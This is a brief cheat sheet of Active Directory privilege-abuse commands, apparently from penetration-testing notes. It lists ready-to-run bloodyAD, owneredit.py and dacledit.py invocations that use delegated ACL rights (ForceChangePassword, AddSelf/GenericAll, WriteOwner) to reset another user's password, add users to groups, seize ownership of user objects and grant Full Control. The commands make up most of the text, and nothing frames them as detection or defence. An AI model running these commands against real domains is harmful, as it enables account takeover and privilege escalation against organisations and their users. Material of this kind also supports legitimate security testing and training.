


### 1. ForceChange User password using BloodyAD


If we have `ForceChangePassword` over a user, we can use bloodyAD to change their password


```bash
bloodyAD --host $IP -u 'ownedUser' -p 'password' set password 'targetuser' 'password-to-be-set'
```



### 2. Add a user to a group using BloodyAD


If we have `AddSelf` for a user or `GenericAll`, we can add them to a group using bloodyAD


```bash
bloodyAD --host $IP -d domain -u 'owneduser' -p 'password' add groupMember "GroupName" "User-to-be-added"
```




### 3. Change OwnerShip of a user  using ownerdit.py


If we have WriteOwner right over a user object, we can use `owneredit.py` to change the object ownership


```bash
owneredit.py domain/owneruser -target 'user-whose-ownership-is-to-be-changed' -action write -new-owner 'new-owner'
```





### Granting GenericAll privilege to abuse ownership of a user object using dacledit.py


```bash
dacledit.py -action write -rights 'Full Control' -principal 'owneduser' -target 'targetuser' 
```